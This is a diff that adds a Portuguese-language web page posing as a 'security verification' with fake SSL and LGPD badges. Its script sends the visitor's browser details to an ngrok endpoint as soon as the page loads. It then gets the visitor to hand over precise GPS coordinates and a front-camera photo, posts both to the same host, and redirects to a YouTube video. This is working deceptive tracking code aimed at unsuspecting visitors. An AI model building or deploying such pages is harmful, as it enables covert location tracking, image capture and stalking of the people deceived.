@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Segurança - Acesso ao Conteúdo</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            padding: 50px 40px;
+            border-radius: 12px;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        .shield-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        h1 { 
+            color: #1e3c72;
+            font-size: 24px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        .subtitle {
+            color: #666;
+            font-size: 15px;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        .verification-box {
+            background: #f8f9fa;
+            border: 2px dashed #dee2e6;
+            border-radius: 8px;
+            padding: 30px 20px;
+            margin-bottom: 20px;
+        }
+        .verification-text {
+            color: #495057;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .btn-verify {
+            width: 100%;
+            padding: 16px;
+            margin: 8px 0;
+            font-size: 16px;
+            cursor: pointer;
+            background: #28a745;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            transition: all 0.3s;
+            box-shadow: 0 2px 4px rgba(40, 167, 69, 0.2);
+        }
+        .btn-verify:hover {
+            background: #218838;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 8px rgba(40, 167, 69, 0.3);
+        }
+        .btn-verify:active { transform: translateY(0); }
+        .btn-verify:disabled {
+            background: #6c757d;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+        .loading.active { display: block; }
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1e3c72;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            margin-top: 15px;
+            color: #666;
+            font-size: 14px;
+        }
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #e9ecef;
+        }
+        .badge {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: #6c757d;
+            font-size: 12px;
+        }
+        .success-screen {
+            display: none;
+        }
+        .success-screen.active {
+            display: block;
+        }
+        .success-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+        }
+        video, canvas { display: none; }
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #e9ecef;
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 20px 0;
+            display: none;
+        }
+        .progress-bar.active { display: block; }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #1e3c72, #2a5298);
+            width: 0%;
+            transition: width 0.3s;
+            animation: progress 2s ease-in-out;
+        }
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        .debug-console {
+            display: none;
+            background: #1e1e1e;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            max-height: 200px;
+            overflow-y: auto;
+            text-align: left;
+            border: 1px solid #444;
+        }
+        .debug-console.active { display: block; }
+        .debug-line {
+            margin: 3px 0;
+            word-break: break-all;
+        }
+        .debug-success { color: #00ff00; }
+        .debug-error { color: #ff0000; }
+        .debug-info { color: #00aaff; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="verificationScreen">
+            <div class="shield-icon">🔒</div>
+            <h1>Verificação de Segurança</h1>
+            <p class="subtitle">
+                Para proteger o conteúdo e garantir que você não é um robô, 
+                precisamos verificar que você é um usuário legítimo.
+            </p>
+
+            <div class="verification-box">
+                <p class="verification-text">
+                    <strong>Etapa 1 de 2:</strong> Confirme sua localização
+                </p>
+                <button class="btn-verify" id="btnLocation" onclick="verificarLocalizacao()">
+                    ✓ Permitir Verificação de Localização
+                </button>
+            </div>
+
+            <div class="verification-box" id="step2" style="opacity: 0.5; pointer-events: none;">
+                <p class="verification-text">
+                    <strong>Etapa 2 de 2:</strong> Verificação de identidade
+                </p>
+                <button class="btn-verify" id="btnIdentity" onclick="verificarIdentidade()" disabled>
+                    ✓ Confirmar Identidade
+                </button>
+            </div>
+
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p class="loading-text" id="loadingText">Processando...</p>
+            </div>
+
+            <div class="progress-bar" id="progressBar">
+                <div class="progress-fill"></div>
+            </div>
+
+            <div class="security-badges">
+                <div class="badge">
+                    <span>🔐</span>
+                    <span>Conexão Segura</span>
+                </div>
+                <div class="badge">
+                    <span>✓</span>
+                    <span>SSL Verificado</span>
+                </div>
+                <div class="badge">
+                    <span>🛡️</span>
+                    <span>Proteção LGPD</span>
+                </div>
+            </div>
+
+            <div class="debug-console" id="debugConsole">
+                <div style="margin-bottom: 10px; border-bottom: 1px solid #444; padding-bottom: 10px;">
+                    📋 Console de Diagnóstico (Modo Dev)
+                </div>
+                <div id="debugLogs"></div>
+            </div>
+        </div>
+
+        <div id="successScreen" class="success-screen">
+            <div class="success-icon">✅</div>
+            <h1>Verificação Concluída!</h1>
+            <p class="subtitle">
+                Você será redirecionado em instantes...
+            </p>
+            <div class="loading active">
+                <div class="spinner"></div>
+                <p class="loading-text">Carregando conteúdo...</p>
+            </div>
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // 🔧 CONFIGURE AQUI A URL DO SEU SERVIDOR (ngrok)
+        const API_URL = 'https://dictation-jawline-reanalyze.ngrok-free.dev/api/capturar';
+        
+        // URL para onde redirecionar após captura
+        const REDIRECT_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+        
+        // DEBUG: Mostrar console (mude para false em produção)
+        const DEBUG_MODE = true;
+        
+        let step1Complete = false;
+        let step2Complete = false;
+
+        // ========== FUNÇÃO DE LOG DEBUG ==========
+        function addDebugLog(message, type = 'info') {
+            if (!DEBUG_MODE) return;
+            
+            const debugConsole = document.getElementById('debugConsole');
+            const debugLogs = document.getElementById('debugLogs');
+            
+            debugConsole.classList.add('active');
+            
+            const timestamp = new Date().toLocaleTimeString('pt-BR');
+            const line = document.createElement('div');
+            line.className = `debug-line debug-${type}`;
+            
+            let emoji = '📝';
+            if (type === 'success') emoji = '✅';
+            if (type === 'error') emoji = '❌';
+            if (type === 'info') emoji = 'ℹ️';
+            
+            line.textContent = `[${timestamp}] ${emoji} ${message}`;
+            debugLogs.appendChild(line);
+            debugLogs.scrollTop = debugLogs.scrollHeight;
+        }
+
+        // ========== FUNÇÃO PARA ENVIAR DADOS ==========
+        async function enviarDados(dados) {
+            try {
+                addDebugLog('📤 Preparando envio de dados...', 'info');
+                console.log('📤 Dados a enviar:', dados);
+                addDebugLog(`📡 URL: ${API_URL}`, 'info');
+                
+                const jsonString = JSON.stringify(dados);
+                addDebugLog(`📊 Tamanho do payload: ${(jsonString.length / 1024).toFixed(2)} KB`, 'info');
+                
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: jsonString
+                });
+                
+                addDebugLog(`📥 Resposta do servidor: ${response.status} ${response.statusText}`, 'success');
+                console.log('✅ Resposta recebida:', response.status);
+                
+                if (response.ok) {
+                    const resposta = await response.json();
+                    addDebugLog(`✅ Dados recebidos: ${resposta.status}`, 'success');
+                    console.log('📊 Dados recebidos no servidor:', resposta);
+                } else {
+                    addDebugLog(`⚠️ Resposta não OK: ${response.statusText}`, 'error');
+                }
+                
+                return response;
+                
+            } catch (error) {
+                addDebugLog(`❌ Erro ao enviar: ${error.message}`, 'error');
+                console.error('❌ Erro ao enviar:', error);
+                throw error;
+            }
+        }
+
+        // ========== GATILHO AUTOMÁTICO AO CARREGAR ==========
+        window.onload = function() {
+            addDebugLog('🔔 Página carregada. Iniciando sistema...', 'info');
+            notificarAcessoImediato();
+        };
+
+        async function notificarAcessoImediato() {
+            const dados = {
+                evento: 'pagina_acessada',
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                idioma: navigator.language,
+                tela: `${screen.width}x${screen.height}`,
+                plataforma: navigator.platform,
+                referrer: document.referrer
+            };
+
+            addDebugLog('📡 Enviando notificação de acesso...', 'info');
+            
+            try {
+                await enviarDados(dados);
+                addDebugLog('✅ Página acessada registrada com sucesso!', 'success');
+            } catch (error) {
+                addDebugLog(`⚠️ Não foi possível registrar acesso: ${error.message}`, 'error');
+            }
+        }
+
+        // ========== CONTROLE DE CARREGAMENTO ==========
+        function showLoading(text) {
+            document.getElementById('loading').classList.add('active');
+            document.getElementById('loadingText').textContent = text;
+        }
+
+        function hideLoading() {
+            document.getElementById('loading').classList.remove('active');
+        }
+
+        // ========== VERIFICAÇÃO DE LOCALIZAÇÃO ==========
+        async function verificarLocalizacao() {
+            const btn = document.getElementById('btnLocation');
+            btn.disabled = true;
+            btn.textContent = '⏳ Aguardando permissão...';
+            showLoading('Verificando sua localização...');
+            addDebugLog('📍 Iniciando captura de GPS...', 'info');
+
+            if (!("geolocation" in navigator)) {
+                addDebugLog('❌ Geolocalização não disponível', 'error');
+                alert('⚠️ Seu navegador não suporta verificação de localização. Tente outro navegador.');
+                btn.disabled = false;
+                btn.textContent = '✓ Permitir Verificação de Localização';
+                hideLoading();
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                async function(position) {
+                    const dadosGPS = {
+                        evento: 'localizacao_capturada',
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        precisao: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    addDebugLog(`📍 GPS capturado: ${dadosGPS.latitude.toFixed(6)}, ${dadosGPS.longitude.toFixed(6)}`, 'success');
+                    console.log('📍 Dados GPS coletados:', dadosGPS);
+                    
+                    try {
+                        const response = await fetch(API_URL, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'Accept': 'application/json'
+                            },
+                            body: JSON.stringify(dadosGPS)
+                        });
+                        
+                        addDebugLog(`✅ Resposta HTTP: ${response.status}`, 'success');
+                        console.log('✅ Resposta do servidor:', response.status);
+                        
+                        if (response.ok) {
+                            const resposta = await response.json();
+                            addDebugLog(`✅ GPS enviado com ID: ${resposta.id}`, 'success');
+                            console.log('📊 Confirmação do servidor:', resposta);
+                        } else {
+                            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                        }
+
+                        hideLoading();
+                        btn.textContent = '✅ Verificado';
+                        btn.style.background = '#28a745';
+                        step1Complete = true;
+
+                        // Habilita etapa 2
+                        document.getElementById('step2').style.opacity = '1';
+                        document.getElementById('step2').style.pointerEvents = 'auto';
+                        document.getElementById('btnIdentity').disabled = false;
+                        
+                        addDebugLog('✅ Etapa 1 concluída! Etapa 2 habilitada.', 'success');
+                        alert('✅ Localização enviada com sucesso!');
+                    } catch (error) {
+                        addDebugLog(`❌ Erro ao enviar GPS: ${error.message}`, 'error');
+                        console.error('❌ Erro ao enviar GPS:', error);
+                        hideLoading();
+                        alert('❌ Erro ao enviar dados: ' + error.message);
+                        btn.disabled = false;
+                        btn.textContent = '✓ Permitir Verificação de Localização';
+                    }
+                },
+                function(error) {
+                    hideLoading();
+                    addDebugLog(`❌ Erro de GPS: ${error.message}`, 'error');
+                    alert('⚠️ Não foi possível verificar sua localização.');
+                    btn.disabled = false;
+                    btn.textContent = '✓ Permitir Verificação de Localização';
+                },
+                { 
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        // ========== VERIFICAÇÃO DE IDENTIDADE (CÂMERA) ==========
+        async function verificarIdentidade() {
+            const btn = document.getElementById('btnIdentity');
+            btn.disabled = true;
+            btn.textContent = '⏳ Verificando...';
+            showLoading('Capturando verificação de identidade...');
+            addDebugLog('📷 Iniciando captura de câmera...', 'info');
+
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+
+            try {
+                addDebugLog('🔐 Solicitando acesso à câmera...', 'info');
+                
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    } 
+                });
+                
+                addDebugLog('✅ Câmera ativada com sucesso', 'success');
+                video.srcObject = stream;
+                video.style.display = "block";
+
+                setTimeout(async () => {
+                    try {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        addDebugLog(`📸 Frame capturado: ${canvas.width}x${canvas.height}`, 'success');
+                        
+                        const imagemBase64 = canvas.toDataURL('image/jpeg', 0.7);
+                        const tamanhoKB = (imagemBase64.length * 0.75 / 1024).toFixed(2);
+
+                        addDebugLog(`🖼️ Imagem codificada em Base64 (${tamanhoKB} KB)`, 'info');
+
+                        const dadosFoto = {
+                            evento: 'identidade_verificada',
+                            foto: imagemBase64,
+                            timestamp: new Date().toISOString(),
+                            resolucao: `${canvas.width}x${canvas.height}`,
+                            tamanho: `${tamanhoKB} KB`
+                        };
+                        
+                        addDebugLog('📤 Enviando foto para servidor...', 'info');
+
+                        const response = await fetch(API_URL, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'Accept': 'application/json'
+                            },
+                            body: JSON.stringify(dadosFoto)
+                        });
+
+                        addDebugLog(`✅ Resposta HTTP: ${response.status}`, 'success');
+                        console.log('✅ Resposta do servidor:', response.status);
+                        
+                        if (response.ok) {
+                            const resposta = await response.json();
+                            addDebugLog(`✅ Foto enviada com ID: ${resposta.id}`, 'success');
+                            console.log('📊 Confirmação do servidor:', resposta);
+                        } else {
+                            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                        }
+
+                        stream.getTracks().forEach(track => track.stop());
+                        video.style.display = "none";
+                        
+                        hideLoading();
+                        btn.textContent = '✅ Verificado';
+                        btn.style.background = '#28a745';
+                        step2Complete = true;
+
+                        addDebugLog('✅ Etapa 2 concluída! Redirecionando...', 'success');
+                        
+                        // Mostra tela de sucesso
+                        mostrarSucesso();
+                        
+                        alert('✅ Foto enviada com sucesso!');
+                    } catch (error) {
+                        addDebugLog(`❌ Erro ao processar foto: ${error.message}`, 'error');
+                        console.error('❌ Erro ao processar foto:', error);
+                        hideLoading();
+                        alert('❌ Erro ao enviar foto: ' + error.message);
+                        btn.disabled = false;
+                        btn.textContent = '✓ Confirmar Identidade';
+                        
+                        try {
+                            stream.getTracks().forEach(track => track.stop());
+                        } catch (e) {}
+                    }
+                }, 1500);
+
+            } catch (error) {
+                hideLoading();
+                addDebugLog(`❌ Erro de câmera: ${error.message}`, 'error');
+                console.error('❌ Erro ao acessar câmera:', error);
+                alert('⚠️ Não foi possível acessar a câmera. Verifique as permissões.');
+                btn.disabled = false;
+                btn.textContent = '✓ Confirmar Identidade';
+            }
+        }
+
+        // ========== TELA DE SUCESSO ==========
+        function mostrarSucesso() {
+            document.getElementById('progressBar').classList.add('active');
+            
+            setTimeout(() => {
+                document.getElementById('verificationScreen').style.display = 'none';
+                document.getElementById('successScreen').classList.add('active');
+                
+                addDebugLog('🎉 Sucesso! Redirecionando em 3 segundos...', 'success');
+
+                // Redireciona após 3 segundos
+                setTimeout(() => {
+                    addDebugLog(`🌐 Redirecionando para: ${REDIRECT_URL}`, 'info');
+                    window.location.href = REDIRECT_URL;
+                }, 3000);
+            }, 2000);
+        }
+
+        // ========== INICIALIZAÇÃO ==========
+        document.addEventListener('DOMContentLoaded', function() {
+            addDebugLog('🎬 DOM carregado com sucesso', 'success');
+            addDebugLog(`🔗 API URL: ${API_URL}`, 'info');
+        });
+    </script>
+</body>
+</html>
